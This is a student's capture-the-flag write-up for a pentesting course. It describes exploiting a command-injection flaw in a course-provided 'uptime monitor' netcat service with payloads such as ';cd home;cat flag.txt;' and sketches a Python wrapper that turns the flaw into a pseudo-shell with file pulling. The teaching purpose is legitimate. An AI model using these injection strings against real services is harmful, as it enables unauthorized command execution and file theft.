Writeup 3 - Pentesting I
======

Name: Michael Zheng
Section: 0101

I pledge on my honor that I have not given or received any unauthorized assistance on this assignment or examination.

Digital acknowledgement of honor pledge: Michael Zheng

## Assignment 4 Writeup

### Part 1 (45 pts)
Since there are rumors that Fred’s new service is vulnerable to a command injection attack, I entered “ls” after “nc cornerstoneairlines.co 45”. It just prints out a blank line. I entered cd for “Enter IP address: cd” and received a blank line too. Then I thought maybe I need to close a pre-existing command with “;” before entering my own commands. I entered “;ls;” and the results:
Network Administration Panel  --  Uptime Monitor
Enter IP address: ;ls;
bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var
Unfortunately, every command I going to enter, I have to repeat “nc cornerstoneairlines.co 45”. I entered “;ls;cd root;ls;”, but nothing shows up. I entered “;ls;cd usr;ls;” which results in:
Network Administration Panel  --  Uptime Monitor
Enter IP address: ;cd usr;ls;
bin games include lib local sbin share src
Then I want to see what’s inside of bin so I entered “;cd usr;cd bin;ls;” which results in:
[ addpart apt apt-cache apt-cdrom apt-config apt-get apt-key apt-mark arch awk b2sum base32 base64 basename bashbug captoinfo catchsegv chage chattr chcon chfn chrt chsh cksum clear clear_console cmp comm csplit ctstat cut deb-systemd-helper deb-systemd-invoke debconf debconf-apt-progress debconf-communicate debconf-copydb debconf-escape debconf-set-selections debconf-show delpart diff diff3 dircolors dirname dpkg dpkg-deb dpkg-divert dpkg-maintscript-helper dpkg-query dpkg-split dpkg-statoverride dpkg-trigger du env expand expiry expr factor faillog fallocate find flock fmt fold free gawk getconf getent getopt gpasswd gpgv groups head hostid i386 iconv id igawk infocmp infotocap install ionice ipcmk ipcrm ipcs ischroot join last lastb lastlog ldd link linux32 linux64 lnstat locale localedef logger logname lsattr lscpu lsipc lslocks lslogins lsmem lsns mawk mcookie md5sum md5sum.textutils mesg mkfifo namei nawk newgrp nice nl nohup nproc nsenter nstat numfmt od pager partx passwd paste pathchk perl perl5.26.1 pgrep pinky pkill pldd pmap pr printenv printf prlimit ptx pwdx rdma realpath rename.ul renice reset resizepart rev rgrep routef routel rtstat runcon savelog script scriptreplay sdiff select-editor sensible-browser sensible-editor sensible-pager seq setarch setsid setterm sg sha1sum sha224sum sha256sum sha384sum sha512sum shred shuf skill slabtop snice sort split stat stdbuf sum tabs tac tail taskset tee test tic timeout tload toe top touch tput tr truncate tset tsort tty tzselect unexpand uniq unlink unshare update-alternatives uptime users utmpdump vmstat w w.procps wall watch wc whereis which who whoami x86_64 xargs yes zdump
This seems incorrect, so I decided to take on a different path. I tried “;cd home;ls;”
Network Administration Panel  --  Uptime Monitor
Enter IP address: ;cd home;ls;         
flag.txt
Now I know the flag is located at flag.txt. I entered “ ;cd home;cat flag.txt; ”
Network Administration Panel  --  Uptime Monitor
Enter IP address: ;cd home;cat flag.txt;
Good! Here's your flag: CMSC389R-{p1ng_as_a_$erv1c3}
After running the command, I found out the flag to be CMSC389R-{p1ng_as_a_$erv1c3}.

### Part 2 (55 pts)
First, I reused my code from the second assignment into my stub.py. I copied the sending and receiving into the execute() function. Since the only way to exit the interactive shell is by entering the “quit”, I made an infinite loop. Then I implemented a nested if statements for the four options. Starting with the “quit” option which quits the program. The “help” option prints out the options an user can use. However, I encountered some issues with the “shell” option. Whenever I tried to “ls” after entering “cd home”, it returns
 bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var
Then I remember from part one of the assignment, every time I entered a command it established a new connection. I need to save the path entered previously.  I create a string variable called attachDirectory. Whenever a user enters “cd <path>”, attachDirectory would add the path. If only “cd” is entered, it would clear the attachDirecory. After resolving the shell issue, I encounter a problem with ‘pull”. I was not able to extract the flag and put it inside my file “pullin.” I discovered I was extracting “flag.txt” in the wrong directory. I decided to move the attachDirectory out of the while loop inside of the “shell” option. This allows my program to extract the flag and write into my file “pullin.”
